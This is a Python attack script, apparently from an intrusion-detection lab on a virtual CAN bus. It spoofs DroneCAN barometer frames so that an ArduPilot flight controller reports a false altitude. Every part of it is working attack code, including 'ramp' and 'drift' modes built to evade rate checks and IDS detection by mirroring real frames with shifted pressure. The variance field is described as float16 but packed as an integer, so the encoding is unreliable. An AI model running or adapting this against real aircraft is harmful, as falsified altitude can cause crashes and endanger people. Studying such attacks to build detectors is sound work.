#!/usr/bin/env python3
"""Node B (Attacker): altitude-sensor (DroneCAN barometer) spoofing for the vcan lab.

Benign baro node we simulate/attack (UAVCAN v0 29-bit ID layout):
    ID = (priority << 24) | (message_type << 8) | source_node_id
    0x10040405 = prio 16, type 1028 (uavcan.equipment.air_data.StaticPressure), node 5
ArduPilot's AP_Baro_DroneCAN consumes StaticPressure (1028) + StaticTemperature (1029)
and converts pressure -> altitude with the ISA model, so a forged frame moves the
flight controller's reported altitude.

Payload (single-frame transfer): float32 static_pressure (Pa, LE) + float16 variance
+ 1 tail byte (SOT=1, EOT=1, toggle=0, transfer-id bits).

Modes:
  sink    - jump to a constant forged altitude (naive - easy for the IDS to catch)
  ramp    - climb at a plausible rate (evades naive rate-limit checks)
  drift   - re-inject every benign baro frame with pressure shifted by --offset Pa
            (stealthy: timing, ID and framing all stay identical)

Run:  python 06_alt_attack.py sink --alt 120
      python 06_alt_attack.py ramp --rate 5 --duration 60
      python 06_alt_attack.py drift --offset -1200      # -1200 Pa ~ +100 m
"""
import argparse
import can
import struct
import time

BARO_ID = 0x10040405
SEA_LEVEL_PA = 101325.0
TAIL_BYTE = 0xC0  # start=1 end=1 toggle=0 transfer_id=0


def alt_to_pa(alt_m: float) -> float:
    """Invert the ISA model h = 44330 * (1 - (P/P0)^(1/5.255))."""
    return SEA_LEVEL_PA * (1.0 - alt_m / 44330.0) ** 5.255


def frame(pressure_pa: float, variance: float = 4.0, tid: int = 0) -> can.Message:
    return can.Message(
        arbitration_id=BARO_ID,
        data=struct.pack("<fH", pressure_pa, int(variance)) + bytes([TAIL_BYTE | (tid & 0x1F)]),
        is_extended_id=True,
    )


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=["sink", "ramp", "drift"])
    ap.add_argument("--alt", type=float, default=100.0, help="sink: forged altitude (m)")
    ap.add_argument("--rate", type=float, default=5.0, help="ramp: climb rate (m/s)")
    ap.add_argument("--offset", type=float, default=-1200.0, help="drift: Pa added to real frames")
    ap.add_argument("--hz", type=float, default=50.0, help="frames per second")
    ap.add_argument("--duration", type=float, default=60.0, help="seconds to run (ramp)")
    ap.add_argument("--channel", default="vcan0")
    args = ap.parse_args()

    bus = can.interface.Bus(channel=args.channel, interface="socketcan")
    period = 1.0 / args.hz
    print(f"ALT attack '{args.mode}' on {args.channel} @ {args.hz:.0f} fps - Ctrl+C to stop")

    tid = 0
    try:
        if args.mode in ("sink", "ramp"):
            t0 = time.time()
            while True:
                alt = args.alt if args.mode == "sink" else args.rate * (time.time() - t0)
                if args.mode == "ramp" and time.time() - t0 > args.duration:
                    break
                bus.send(frame(alt_to_pa(alt), tid=tid))
                tid = (tid + 1) & 0x1F
                time.sleep(period)
        else:  # drift: mirror-and-shift every real baro frame seen on the bus
            notifier = can.Notifier(bus, [can.Listener()])  # keep RX buffers drained
            while True:
                msg = bus.recv(timeout=1.0)
                if msg is None or msg.arbitration_id != BARO_ID:
                    continue
                p, var = struct.unpack("<fH", bytes(msg.data[:6]))
                bus.send(frame(p + args.offset, var, tid=tid))
                tid = (tid + 1) & 0x1F
    except KeyboardInterrupt:
        pass
    finally:
        print("stopped")


if __name__ == "__main__":
    main()
